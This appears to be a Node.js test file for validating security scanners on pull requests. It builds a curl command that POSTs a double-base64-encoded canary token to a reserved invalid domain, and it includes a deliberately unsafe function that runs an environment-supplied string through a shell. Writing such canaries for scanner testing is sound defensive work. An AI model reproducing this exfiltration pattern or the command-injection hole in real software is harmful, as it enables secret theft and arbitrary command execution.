"use strict";

/**
 * SAFE SECURITY-CANARY SIMULATION (INTENTIONAL):
 * - Uses only CANARY_TEST_TOKEN (never real secrets)
 * - Double-base64 encodes the canary string to imitate stealthy behavior
 * - Targets a reserved invalid domain (example.invalid) so no data leaves
 * - This file is for scanner validation on PRs, not production use
 */

const { execSync } = require("child_process");

function encodeTwice(input) {
  const first = Buffer.from(String(input), "utf8").toString("base64");
  return Buffer.from(first, "utf8").toString("base64");
}

function runCanarySimulation() {
  const canary = process.env.CANARY_TEST_TOKEN || "CANARY_TOKEN_ONLY";
  const encoded = encodeTwice(canary);

  // Non-routable/reserved domain used intentionally for safe simulation.
  const sink = "https://example.invalid/security-canary";
  const cmd = `curl -sS -X POST '${sink}' -d token='${encoded}'`;

  // Guard rail so this never executes accidentally.
  if (process.env.ALLOW_CANARY_EXFIL_SIM !== "1") {
    return {
      simulated: true,
      sink,
      encodedTokenPreview: encoded.slice(0, 12) + "...",
      note: "Set ALLOW_CANARY_EXFIL_SIM=1 to run inert canary simulation"
    };
  }

  try {
    // Intentional command construction pattern for scanner behavior testing.
    const output = execSync(cmd, { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
    return { simulated: false, sink, output };
  } catch (err) {
    return { simulated: false, sink, error: err.message };
  }
}

function intentionallyUnsafeExecPath() {
  // Intentionally vulnerable pattern for scanner validation:
  // untrusted input is executed by a shell command.
  const untrusted = process.env.CANARY_UNTRUSTED_CMD || "echo canary";
  return execSync(untrusted, { encoding: "utf8" });
}

if (require.main === module) {
  if (process.env.RUN_UNSAFE_CANARY_DEMO === "1") {
    intentionallyUnsafeExecPath();
  }
  const result = runCanarySimulation();
  console.log(JSON.stringify(result, null, 2));
}

module.exports = { runCanarySimulation, encodeTwice, intentionallyUnsafeExecPath };
